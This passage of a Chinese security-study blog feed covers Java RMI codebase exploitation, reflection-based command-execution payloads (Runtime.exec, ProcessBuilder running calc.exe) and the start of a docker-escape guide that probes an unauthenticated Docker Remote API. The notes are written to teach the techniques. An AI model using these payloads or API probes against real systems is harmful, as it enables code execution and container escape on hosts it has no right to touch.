hello()。整个过程的大致就是，服务器注册RMI服务，将对象与Name绑定，客户端通过lookup在RMI Registry中寻找要加载远程对象，然后再发起请求从RMI Server上调用方法。 第一篇讲了 RMI 的整个过程和原理，那我们想一下 RMI 会给我们带来哪些安全问题呢？P神的文章里提出了两个思考问题： 如果我们能访问RMI Registry服务，如何对其攻击？ 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？ 第一个问题，怎么攻击 RMI Registry？首先，RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直接访问“后台”功能，比如修改远程服务器上Hello对应的对象： 123RemoteHelloWorld h = new RemoteHelloWorld();//这里我们把ip替换成了其他的ipNaming.rebind(&quot;rmi://192.168.135.142:1099/Hello&quot;, h); 但是我们发现会报错我们看到这里创建并运行了RMI Registry，但是并不能绑定对象，并且产生了报错，这又是为什么呢？ 因为Java对远程访问RMI Registry做了限制，只有来源地址是localhost(127.0.0.1)的时候，才能调用rebind、bind、unbind等方法。不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象： 1String[] s = Naming.list(&quot;rmi://192.168.135.142:1099&quot;); lookup作用就是获得某个远程对象。 那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。但是这个攻击方法的攻击力太低了，接下来介绍一个攻击力强的多的方法。 RMI相关攻击手法 – RMI利用codebase执行任意代码这里我们就来说说 codebase 是什么。codebase是一个地址，即url，告诉Java虚拟机我们应该从哪个地方去搜索类，codebase通常是远程URL，比如http、ftp等。例如，如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 http://example.com/org/vulhub/example/Example.class ，并作为Example类的字节码。RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。这个和python中的导入的包也是一个道理，首先会在当前路径下寻找有没有这个包，如果没有，才是在环境变量 PYTHONPATH中或者是Python 标准库目录下去寻找。 那这时候如果codebase被我们控制，我们不就可以加载恶意类了吗？事实是确实是这样的，但是这个利用方法也有一定的局限性，只有满足下面两个条件才能利用这个漏洞 安装并配置了SecurityManager Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置。 从 Java 7 开始，由于安全考虑，官方将 java.rmi.server.useCodebaseOnly 的默认值从false改为了 true。当 java.rmi.server.useCodebaseOnly 配置为 true 时，Java 虚拟机将只信任预先配置好的 codebase，不再支持从 RMI 请求中获取 codebase 信息。 但是感觉这个java版本和配置的要求现在也很少见了，但是这里涉及到第二个问题和RMI的第三篇文章，所以我们还是简单的叙述解释一下步骤一下。这里还是按照P神在文章中给出的方法。首先建立有关 RMI Server的4个文件① ICalc.java 123456import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote &#123; public Integer sum(List&lt;Integer&gt; params) throws RemoteException; &#125; ② Calc.java 1234567891011121314import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; import java.rmi.server.UnicastRemoteObject; public class Calc extends UnicastRemoteObject implements ICalc &#123; public Calc() throws RemoteException &#123;&#125; public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123; Integer sum = 0; for (Integer param : params) &#123; sum += param; &#125; return sum; &#125; &#125; ③ RemoteRMIServer.java 1234567891011121314151617181920import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; import java.util.List; public class RemoteRMIServer &#123; private void start() throws Exception &#123; if (System.getSecurityManager() == null) &#123; System.out.println(&quot;setup SecurityManager&quot;); System.setSecurityManager(new SecurityManager()); &#125; Calc h = new Calc(); LocateRegistry.createRegistry(1099); Naming.rebind(&quot;refObj&quot;, h); &#125; public static void main(String[] args) throws Exception &#123; new RemoteRMIServer().start(); &#125; &#125; ④ client.policy 123grant &#123; permission java.security.AllPermission; &#125;; 编译及运行 12javac *.javajava -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer 这里记得版本一定要正确，不然就会一直报错 错误: 找不到或无法加载主类，我是用的 jdk 7u13然后，我们再建立一个RMIClient.java 123456789101112131415161718import java.rmi.Naming; import java.util.List; import java.util.ArrayList; import java.io.Serializable; public class RMIClient implements Serializable &#123; public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125; public void lookup() throws Exception &#123; ICalc r = (ICalc) Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;); List&lt;Integer&gt; li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); &#125; public static void main(String[] args) throws Exception &#123; new RMIClient().lookup(); &#125; &#125; 这个Client我们需要在另一个位置运行，不能将RMIClient.java放在RMI Server所在的目录中，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才会去加载codebase中的类然后运行RMIClient： 1java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient 这里的 http://example.com 就是我们的存放着恶意字节码文件(.class文件)的网站。 codebase传递和利用的原理第二篇说了这个漏洞，那第三篇就来说一下这个漏洞的过程和原理我们在执行上一个漏洞的整个流程中进行抓包，会发现进行攻击的时候，也有两个 TCP 连接： 本机与RMI Registry的通信（1099端口） 本机与RMI Server的通信 我们用 tcp.stream eq 0 来筛选出本机与RMI Registry的数据流：我们打开协议为 RMI ，描述为 JRMI、Call 的包，看到最后有段数据由0xACED开头，这是一段Java序列化数据。我们可以使用，SerializationDumper这个工具对Java序列化数据进行分析。 分析之后会看到用类似BNF（巴科斯范式）的形式描述的序列化数据语法。然后我们分析序列化之后的数据，可知，这一整个序列化对象，其实描述的就是一个字符串，其值是 refObj 。意思是获取远程的 refObj 对象。然后我们看一下描述为 JRMI,ReturnData的这一个数据包。在这个数据包中，有一段数据储存在 objectAnnotation 中，这段数据记录了 RMI Server的地址和端口，接下来就开始调用远程方法。我们用tcp.stream eq 1 筛选出本机与RMI Server的数据流，在这个数据流中，没有看到识别为 RMI 协议的包，我们看到其中的一个数据包是是 50 ac ed 开头，50是指 RMI Call，ac ed就是指java序列化的数据，我们用上面提到的工具分析一下这段数据。 (图源于P神-java安全漫谈)可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。所以，即使我们没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其指向攻击者的恶意网站。 这里介绍补充一下什么是classAnnotations？在序列化Java类的时候用到了一个类，叫 ObjectOutputStream ，用于将 Java 对象序列化为字节流。它继承自 OutputStream 类，并提供了一系列方法来将 Java 对象写入输出流中。这个类内部有一个方法annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。 所以说，在分析序列化数据时，如果我们看到了 classAnnotations，那么实际上这些注解信息就是通过 annotateClass 方法写入到序列化数据中的。 换句话说，当一个类被序列化时，它的注解信息可能会被记录下来并写入序列化数据中。当我们在反序列化过程中恢复对象时，这些注解信息也会随着对象一起被读取。如果我们在分析序列化数据时看到了 classAnnotations，那么我们可以推断这些注解信息是在序列化过程中通过 annotateClass 方法写入的。","categories":[{"name":"Java学习","slug":"Java学习","permalink":"https://qingwan.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[],"author":"Qingwan"},{"title":"Java安全漫谈学习笔记① -- Java反射 (1-3)","slug":"Java安全漫谈--反射","date":"2024-05-09T07:20:09.659Z","updated":"2024-05-09T07:26:51.931Z","comments":true,"path":"2024/05/09/Java安全漫谈--反射/","link":"","permalink":"https://qingwan.top/2024/05/09/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--%E5%8F%8D%E5%B0%84/","excerpt":"这个系列的博客主要是在看P神的安全漫谈之后的一些笔记还有对应一些地方的扩展以及自己的了解。","text":"这个系列的博客主要是在看P神的安全漫谈之后的一些笔记还有对应一些地方的扩展以及自己的了解。 Java基础知识在学习反射之前，我们先了解一下关于 java 的基础知识 java运行的全过程 Java源代码—-&gt;编译器—-&gt;jvm可执行的Java字节码(即虚拟指令)—-&gt;jvm—-&gt;jvm中解释器—–&gt;机器可执行的二进制机器码—-&gt;程序运行。 java和c++的区别 都是面向对象的语言，都支持封装、继承和多态 Java不提供指针来直接访问内存，程序内存更加安全 Java的类是单继承的，C++支持多重继承；虽然Java的类不可以多继承，但是接口可以多继承。 Java有自动内存管理机制，不需要程序员手动释放无用内存 基础语法 数据类型①基本数据类型 数值型 整数类型(byte,short,int,long) 浮点类型(float,double) 字符型(char) 布尔型(boolean)②引用数据类型引用数据类型 类(class) 接口(interface) 数组([]) 访问修饰符 修饰符 当前类 同包 子类 其他包 private √ × × × default √ √ × × protected √ √ √ × public √ √ √ √ this关键字的用法this是自身的一个对象，代表对象本身，可以理解为：指向对象本身的一个指针。this的用法在java中大体可以分为3种：① 普通的直接引用，this相当于是指向当前对象本身。 ② 形参与成员名字重名，用this来区分：如： 1234public Person(String name, int age) &#123; this.name = name; this.age = age;&#125; ③ 引用本类的构造函数，当为这个作用时this（参数）：调用本类中另一种形式的构造函数（应该为构造函数中的第一条语句）。 12345678910111213141516class Person&#123; private String name; private int age; public Person() &#123; &#125; public Person(String name) &#123; this.name = name; &#125; public Person(String name, int age) &#123; //调用其他的构造方法 this(name); this.age = age; &#125;&#125; this用处大概可以总结到一段代码里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public class Person &#123; private String name; // 构造方法1：初始化姓名 public Person(String name) &#123; this.name = name; // 使用this关键字区分实例变量和局部变量 &#125; // 构造方法2：不带参数 public Person() &#123; this(&quot;Unknown&quot;); // 调用另一个构造方法初始化姓名 &#125; // 获取姓名 public String getName() &#123; return this.name; // 返回实例变量name &#125; // 设置姓名 public void setName(String name) &#123; this.name = name; // 使用this关键字指代当前对象的实例变量 &#125; // 打印个人信息 public void printInfo() &#123; System.out.println(&quot;Name: &quot; + this.name); &#125; // 返回当前对象的引用 public Person getSelf() &#123; return this; &#125; // 使用当前对象调用其他方法 public void doSomething() &#123; // do something &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; // 创建Person对象 Person person1 = new Person(&quot;Alice&quot;); // 使用构造方法2创建Person对象 Person person2 = new Person(); // 输出姓名 System.out.println(&quot;Person 1 Name: &quot; + person1.getName()); System.out.println(&quot;Person 2 Name: &quot; + person2.getName()); // 设置姓名 person1.setName(&quot;Bob&quot;); System.out.println(&quot;Person 1 Name after modification: &quot; + person1.getName()); // 返回当前对象的引用 Person self = person1.getSelf(); // 调用其他方法 self.doSomething(); &#125;&#125; 反射 什么是反射？反射的作用？Java反射（Reflection）是Java编程语言中的一个强大特性，它允许程序在运行时检查和修改类、方法、字段和接口。这意味着你可以在程序运行时获取类的信息，创建对象，调用方法，甚至修改字段值，这一切都可以动态地进行。定义：JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法，这种动态获取、调用对象方法的功能称为java语言的反射机制，程序在运行期可以拿到一个对象的所有信息。。 反射是通过Class对象(字节码文件)，来知道某个类的所有属性和方法。也就是说通过反射我们可以获取构造器，对象，属性，方法。在JAVA框架中，很多类我们是看不见的，不能直接用类名去获取对象，只能通过反射去获取。 对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态特性。 动态特性：“⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，称之为动态特性”。 在Java中，每个类都有一个与之关联的Class对象。你可以通过以下几种方式获取Class对象： 使用Class.forName()方法，传入类的全路径名称。 调用对象的getClass()方法。 使用.class语法，例如String.class。 一旦你有了Class对象，你就可以使用它来： 获取类实现的接口。 获取类的超类。 访问类的构造函数、方法和字段。 例如，你可以使用getDeclaredMethods()来获取类中声明的所有方法，或者使用getField()来访问类的公共字段。Java反射还可以用于： 动态创建对象。 动态调用方法。 动态操作属性。 反射中重要的方法 获取类的⽅法： forName 实例化类对象的⽅法： newInstance 获取函数的⽅法： getMethod 执⾏函数的⽅法： invoke 如何理解反射？如何理解反射：平时我们要调用某个类中的方法的时候都需要创建该类的对象，通过对象去调用类里面的方法，反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了，在这种情况下（没有创建对象）我们都能够对它的方法和属性进行调用，我们把这种 动态获取对象信息和调用对象方法的功能称之为反射机制。 利用反射获取一个对象的步骤获取类的 Class 对象实例（这里有三种方法，后面会讲到）-&gt; 根据 Class 对象实例获取 Constructor（构造函数） 对象 -&gt; 使用 Constructor 对象的 newInstance 方法(实例)获取反射类对象 反射的常见利用用反射的地方一搬都是需要操作类的地方。这里先问下，反射机制的相关类在哪个包下？答案是java.lang.reflect.*，比如： java.lang.reflect.Method 代表字节码中的方法字节码。代表类中的方法。 java.lang.reflect.Constructor 代表字节码中的构造方法字节码。代表类中的构造方法。 java.lang.reflect.Field 代表字节码中的属性字节码。代表类中的成员变量（静态变量+实例变量）。 那到底是怎么获取的呢？① 动态加载类和调用方法： 反射机制可以在运行时加载类，并调用类的方法。这在编写插件系统、框架和库时非常有用，因为它允许应用程序根据需要动态加载和调用类的功能。 12345 // 动态加载类和调用方法Class&lt;?&gt; clazz = Class.forName(&quot;com.example.MyClass&quot;);Object instance = clazz.newInstance();Method method = clazz.getMethod(&quot;myMethod&quot;, String.class);method.invoke(instance, &quot;parameter&quot;); ② 读取和修改类的字段： 反射机制使得可以在运行时获取和修改类的字段，即使这些字段是私有的。这在某些情况下（如序列化和反序列化）非常有用。 12345// 读取和修改类的字段Field field = clazz.getDeclaredField(&quot;myField&quot;);field.setAccessible(true); // 使私有字段可访问Object value = field.get(instance); // 读取字段值field.set(instance, newValue); // 修改字段值 ③ 构造对象： 反射机制可以使用类的构造器动态创建对象，甚至可以访问私有构造器。 1234 // 构造对象Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class);constructor.setAccessible(true); // 使私有构造器可访问Object instance = constructor.newInstance(&quot;parameter&quot;); 反射机制的优缺点反射机制在Java中提供了灵活性和通用性，使得程序能够在运行时动态地操作类、方法和属性，这增强了代码的灵活性和可扩展性，同时也支持与外部资源交互，为框架和库的设计提供了便利。然而，反射也存在性能开销高、安全性差、代码复杂度增加以及调试困难等缺点，需要谨慎使用以权衡其带来的好处和代价。 安全漫谈①-③反射①反射的第一篇文章主要讲了下 forName() 方法，这里简要介绍一下：关于这个方法主要提出几个问题并且对其进行解决。 他的作用是什么？ 使用方法是什么？ 他和其他获取类的方法有什么区别？ 首先第一个问题，直接说，Class.forName 方法的作用，就是初始化给定的类，通俗点说就是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段，并返回与该类相关的Class对象。Class.forName(xxx.xx.xx)返回的是一个类。至于他的使用方法，forName 有两个函数重载： 123Class.forName(String name)Class.forName(String name, boolean initialize, ClassLoader loader) 第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化，这个参数为true时会加载执行静态函数的代码。；第三个参数就是 ClassLoader 。 注意：使用这个方法必须知道类的全路径名。 这里ClassLoader是什么，我们先不做详细的介绍，ClassLoader翻译过来就是类加载器，简单的说一下他的作用就是，当你运行一个 Java 程序时，Java 虚拟机（JVM）会负责加载程序中用到的类。类加载器（ClassLoader）是负责在运行时查找和加载类文件的组件。在Java中，所有的类，都是由ClassLoader加载到JVM中执行的，但JVM中不止一种ClassLoader。 那知道 forName() 方法的作用和使用方法之后，我们就来用下面一段代码实验一下第一种加载： 12345678910public class Test &#123; public static void main(String[] args) throws ClassNotFoundException &#123; //通过forName方法获取类的实例Class c1 = Class.forName(&quot;java.lang.String&quot;); System.out.print(&quot;Class represented by c1: &quot; + c1.toString()); &#125; &#125; 第二种加载： 12345678910111213141516171819public class Test &#123; public static void main(String[] args) throws ClassNotFoundException &#123; // 指定要加载的类名 String className = &quot;java.lang.String&quot;; // 指定是否立即初始化加载的类（true 表示立即初始化） boolean initialize = true; // 使用系统类加载器作为类加载器 ClassLoader loader = ClassLoader.getSystemClassLoader(); // 调用 Class.forName() 方法加载类 Class&lt;?&gt; clazz = Class.forName(className, initialize, loader); // 输出加载的类名 System.out.println(&quot;Class represented by clazz: &quot; + clazz); &#125;&#125; 第三个问题，要知道和其他方法的区别，那我们就得先知道还有哪些常用的方法 1. 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类。调用Object类的getClass()方法来得到Class对象。比如： 12345678910public class Test &#123; public static void main(String[] args) throws ClassNotFoundException &#123; // 假设使用 String 类来示例 String x = &quot;Hello&quot;; Class c1 = x.getClass(); System.out.print(&quot;Class represented by c1: &quot; + c1.toString()); &#125; &#125; 这个方法用的最少 使用Class类的中静态forName()方法获得与字符串相应的Class对象。就是我们前面说到的那个方法，也是最常用的一个方法。 获取Class类型对象的第三个方法最简单。用法就是：Test.class如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这种方式虽然比较简单，但是需要导包，不然会编译错误，这一种方法不属于反射。 123456789101112public class Test &#123; public class MyClass &#123; // 一个简单的示例类 &#125; public static void main(String[] args) &#123; // 使用 .class 属性获取 MyClass 类的 Class 对象 Class&lt;?&gt; clazz = MyClass.class; // 打印 Class 对象 System.out.println(&quot;Class represented by clazz: &quot; + clazz); &#125; &#125; 这三种方法主要在使用场景上有所不同调用对象的 getClass() 方法： - 这种方式适用于已经存在对象实例，想要获取其对应的 Class 对象的情况。 - 通常用于在运行时动态获取对象的类型信息，例如对于传入的参数对象，需要了解其具体的类型。使用 Class.forName() 方法： - 这种方式适用于根据类名（字符串）动态地加载类，并获取其 Class 对象的情况。 - 通常用于实现插件机制、动态配置类名等场景。直接使用 .class 属性： - 这种方式是在编译时已知类名的情况下，直接获取该类的 Class 对象的一种简洁方式。 - 通常用于已知类名的情况下，或者在静态上下文中（例如静态方法或静态代码块）获取类的 Class 对象。 反射②第二篇呢开头指出，在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。 Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和C1$C2.class ，我们可以把他们看作两个无关的类，通过 Class.forName(&quot;C1$C2&quot;) 即可加载这个内部类。 获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是：① 你使用的类没有无参构造函数② 你使用的类构造函数是私有的 最常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但我们不能直接这样来执行命令： 12Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.newInstance(), &quot;id&quot;); 会出现报错，原因是 Runtime 类的构造方法是私有的。这里可能会问 为什么Runtime 类是私有的呢？为什么这其实涉及到很常见的设计模式：“单例模式”，也叫工厂模式。 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来获取： 123456789public class TrainDB &#123;private static TrainDB instance = new TrainDB();public static TrainDB getInstance() &#123;return instance;&#125;private TrainDB() &#123;// 建立连接的代码...&#125;&#125; 这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建立多个数据库连接。 所以，Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象。那这里可能又有个问题，为什么Runtime.getRuntime()就可以获取到呢？ 在 Runtime 类中，构造方法被私有化，这意味着无法直接通过 new 关键字来创建 Runtime 对象的实例。然而，Runtime 类提供了一个静态方法 getRuntime()，用于获取 Runtime 类的唯一实例。 我们将上述Payload进行修改即可正常执行命令了： 1Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;,String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc.exe&quot;); 这里用到了 getMethod 和 invoke 方法。我们在开头也提到过。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表。 我们使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用getMethod(&quot;exec&quot;, String.class) 来获取 Runtime.exec 方法。String.class 表示 String 类的 Class 对象，它指示了方法 exec 所接受的参数类型为 String invoke 的作用是执行方法，它的第一个参数是：如果这个方法是一个普通方法，那么第一个参数是类对象如果这个方法是一个静态方法，那么第一个参数是类 举个例子： 普通方法：普通方法是属于类的实例的方法，它们依赖于对象的存在。在调用普通方法时，第一个参数通常是该方法所属的类的实例（对象）。这个实例会作为调用方法的上下文，方法在执行时可以访问该实例的成员变量和其他方法。 1234567891011public class Example &#123; public void instanceMethod() &#123; System.out.println(&quot;This is an instance method.&quot;); &#125; public static void main(String[] args) throws Exception &#123; Example obj = new Example(); Method method = Example.class.getMethod(&quot;instanceMethod&quot;); method.invoke(obj); // 调用普通方法时，第一个参数是类对象 &#125;&#125; 在上面的例子中，instanceMethod 是一个普通方法，调用时需要传入一个 Example 类的实例作为第一个参数。 静态方法：静态方法是属于类本身的方法，它们不依赖于类的实例。在调用静态方法时，第一个参数是该方法所属的类对象本身。 1234567891011public class Example &#123; public static void staticMethod() &#123; System.out.println(&quot;This is a static method.&quot;); &#125; public static void main(String[] args) throws Exception &#123; Method method = Example.class.getMethod(&quot;staticMethod&quot;); method.invoke(Example.class); // 调用静态方法时，第一个参数是类对象 &#125;&#125; 在上面的例子中，staticMethod 是一个静态方法，调用时直接使用 Example.class 作为第一个参数即可。 所以，总结一下： 普通方法依赖于类的实例，需要使用实例对象来调用。 静态方法不依赖于类的实例，可以直接使用类本身来调用。 所以我们正常执行方法是 [1].method([2], [3], [4]...) ，其实在反射里就是method.invoke([1], [2], [3], [4]...) 。 举个例子： 12345678910111213141516171819import java.lang.reflect.Method; public class Test &#123; public void printMessage(String message) &#123; System.out.println(&quot;Normal method: &quot; + message); &#125; public static void main(String[] args) throws Exception &#123; Test obj = new Test(); // 正常方法调用 obj.printMessage(&quot;Hello, world!&quot;); // 反射调用 Method method = Test.class.getMethod(&quot;printMessage&quot;, String.class); method.invoke(obj, &quot;Hello, world using reflection!&quot;); &#125; &#125; 所以我们将上面命令执行的payload分解一下就可以得到 12345Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;);Object runtime = getRuntimeMethod.invoke(clazz);execMethod.invoke(runtime, &quot;calc.exe&quot;); 反射③在上面第二篇结束的时候留下了两个问题 如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？ 如果一个方法或构造方法是私有方法，我们是否能执行它呢？ 第一个问题，我们需要用到一个新的反射方法 getConstructor。和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。获取到构造函数后，我们使用 newInstance 来执行。比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用start() 来执行命令： 1Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start(); ProcessBuilder有两个构造函数： 12public ProcessBuilder(List&lt;String&gt; command)public ProcessBuilder(String... command) 上面用到了第一个形式的构造函数，所以在 getConstructor 的时候传入的是 List.class 。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，将 newInstance 返回的 Object 类型转换为 ProcessBuilder 类型。因为 newInstance 返回的是一个泛型为 Object 的对象，而我们知道它实际上是一个 ProcessBuilder 对象，所以我们进行了强制类型转换。有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。 其实用的就是前面讲过的知识： 12Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))); 通过 getMethod(&quot;start&quot;) 获取到start方法，然后 invoke 执行，invoke 的第一个参数就是ProcessBuilder Object了。 运行一下 12345678910111213141516import java.util.Arrays; import java.util.List; public class Test &#123; public static void main(String[] args) &#123; try &#123; // 反射获取 ProcessBuilder 类 Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;); // 创建 ProcessBuilder 对象并启动进程 clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; 那么，如果我们要使用 public ProcessBuilder(String... command) 这个构造函数，需要怎样用反射执行呢？对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二种构造函数： 12Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);clazz.getConstructor(String[].class) 在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下： 123Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(newString[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;)).start(); 那第二个问题，如果一个方法或构造方法是私有方法，我们是否能执行它呢？这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了。 getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和getConstructor 类似，我就不再赘述。 举个例子，前文说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例化对象，进而执行命令，例如： 1234567891011121314151617import java.lang.reflect.Constructor; import java.util.Arrays; import java.util.List; public class Test &#123; public static void main(String[] args) &#123; try &#123; // 反射获取 ProcessBuilder 类 Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); Constructor m = clazz.getDeclaredConstructor(); m.setAccessible(true); clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; 可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用setAccessible 修改它的作用域，否则仍然不能调用。","categories":[{"name":"Java学习","slug":"Java学习","permalink":"https://qingwan.top/categories/Java%E5%AD%A6%E4%B9%A0/"}],"tags":[],"author":"Qingwan"},{"title":"docker逃逸相关手法","slug":"docker逃逸","date":"2024-03-05T04:54:48.841Z","updated":"2024-03-05T05:25:48.518Z","comments":true,"path":"2024/03/05/docker逃逸/","link":"","permalink":"https://qingwan.top/2024/03/05/docker%E9%80%83%E9%80%B8/","excerpt":"本文主要讲了docker逃逸的原因，判断方法以及利用手法","text":"本文主要讲了docker逃逸的原因，判断方法以及利用手法 有时候无论是实战中还是在CTF中，在我们打进机器之后，发现在docker里面，这时候我们当然想逃逸到真实宿主机，所以就要用到docker逃逸 引起docker逃逸漏洞的原因那在开始实验之前，我们先想一下是什么使我们可以进行docker逃逸呢，原因主要有以下几个 内核漏洞： 如果宿主机内核存在漏洞，攻击者可能通过在容器内部执行恶意代码来利用这些漏洞，最终获取宿主机的控制权。 配置错误： 错误的Docker配置可能导致容器以特权模式运行，这使得攻击者更容易在容器内部执行恶意操作并逃逸到宿主机。 不安全的容器镜像： 使用不安全的或未经验证的容器镜像可能包含已知的漏洞，攻击者可以利用这些漏洞来逃逸。 不安全的容器之间通信： 如果容器之间的通信不受适当的隔离，攻击者可能通过网络攻击或其他手段在容器之间移动，并最终逃逸到宿主机。 过多的权限： 如果Docker容器被授予不必要的权限，攻击者可以利用这些权限执行恶意操作并逃逸。这里可能不太理解，后面在进行实验的时候再详细的说 判断是否在docker环境方法一：判断根目录下有无 .dockerenv 文件 1ls -al 方法二：查询系统进程的 cgroup 信息是否存在 docker 字符串 12ls -alh /.dockerenvcat /proc/1/cgroup 方法三：检查是否存在 container环境变量通过env \\ PATH 来检查是否有 docker 相关的环境变量，来辅助判断 123envenv $PATHset 方法四：其他检测方法检测 mount、fdisk -l 查看硬盘 、判断PID 1的进程名等也可用来辅助判断 123mount | grep &quot;docker&quot;fdisk -lps -aux docker逃逸的方法危险的配置导致Docker 逃逸Docker Remote API 未授权访问docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。影响版本：Docker version 19.03.12 之前版本 确定漏洞是否存在：访问http://x.x.x.x:2375/version 查看是否有版本信息 1234#列出容器信息，效果与docker ps一致。 curl http://&lt;target&gt;:2375/containers/json #启动容器docker -H tcp://&lt;target&gt;:2375 ps -a 